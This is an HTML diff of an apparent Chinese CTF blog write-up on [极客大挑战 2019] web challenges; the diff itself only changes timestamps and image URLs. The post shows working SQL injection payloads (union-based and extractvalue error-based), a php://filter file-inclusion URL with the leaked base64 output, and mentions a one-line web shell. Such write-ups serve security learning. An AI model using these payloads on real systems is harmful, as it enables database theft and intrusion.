@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210429085607052.png">
 <meta property="article:published_time" content="2021-04-01T10:35:34.014Z">
-<meta property="article:modified_time" content="2021-05-07T11:26:36.838Z">
+<meta property="article:modified_time" content="2021-05-25T16:22:22.662Z">
 <meta property="article:author" content="Fish">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
@@ -59,7 +59,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2021-05-07 19:26:36'
+  postUpdate: '2021-05-26 00:22:22'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -147,27 +147,27 @@
 
 <h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><ul>
 <li><p>首先查出单引号报错</p>
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212244339.png" style="zoom:67%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212244339.png" style="zoom:67%;" />
 
-<p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212257596.png"></p>
+<p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212257596.png"></p>
 </li>
 <li><p>尝试用万能密码登录，发现只是一个无用的值，CMD5网站也无法破解，尝试其他方法</p>
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212341586.png" style="zoom: 67%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212341586.png" style="zoom: 67%;" />
 
 </li>
 </ul>
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212405252.png" style="zoom: 33%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212405252.png" style="zoom: 33%;" />
 
 <ul>
 <li><p>尝试中断注入，联合注入查看其他信息可以看到用到了查询的第2，3个字段</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212657106.png" style="zoom: 33%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212657106.png" style="zoom: 33%;" />
 </li>
 <li><p>获取当前数据库名，回显出当前数据库名为<code>geek</code></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212841772.png"  style="zoom:33%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401212841772.png"  style="zoom:33%;" />
 </li>
 <li><p>查询数据库里面的表名称</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有表名</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">&#x27;database_name&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有列名</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">&#x27;表名&#x27;</span> <span class="keyword">and</span> table_schema= <span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -180,7 +180,7 @@
 
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401213635841.png" style="zoom:33%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210401213635841.png" style="zoom:33%;" />
 </li>
 <li><p>获取数据库中信息</p>
 <p>我先是手工查，后面加了一个where语句条件就直接出了。。运气好，网上师傅wp都是把表中的数据全部荡下来。学习一手</p>
@@ -199,17 +199,17 @@
 <li><p>爆库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1&#39;^extractvalue(1,concat(0x5e,(select(database()))))%23</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210428215743886.png"></p>
+<p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428215743886.png"></p>
 </li>
 <li><p>爆表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1&#39;^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210428220751357.png"></p>
+<p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428220751357.png"></p>
 </li>
 <li><p>爆字段名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1%27^extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210428221118649.png"></p>
+<p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428221118649.png"></p>
 </li>
 <li><p>查flag</p>
 <p>需要用left和right分别查左边和右边，然后个flag拼接</p>
@@ -226,18 +226,18 @@
 <h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>SQL盲注</p>
 <h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>考点：本地文件包含，<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a></p>
 <p>抓包抓到一个特殊文件，访问目录查看</p>
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410170938938.png" style="zoom: 67%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410170938938.png" style="zoom: 67%;" />
 
 <p>查看为本地文件包含，但是访问flag.php却什么也没有。使用php://filter协议对文件进行base64编码查看</p>
-<p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410171054700.png"></p>
+<p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410171054700.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问后缀：secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
 
 <p><code>flag.php</code>中的内容全部以base64编码的形式输出，在线解码得到flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MWZkYzRlMDItODU1MS00ZTY3LThkNzUtZmY3ZDkzZDJmNjg5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410171524485.png"></p>
+<p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410171524485.png"></p>
 <h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>一句话木马，直接用蚁剑连接网站后台，<code>flag</code>在根目录</p>
-<img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410171850050.png" style="zoom:80%;" />
+<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210410171850050.png" style="zoom:80%;" />
 
 <h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>考察网站常用备份后缀名，PHP的序列化与反序列化</p>
 <p>首先提示了网站备份，用常用的网站备份字典爆破，爆破出<code>www.zip</code>，在后缀输入下载</p>
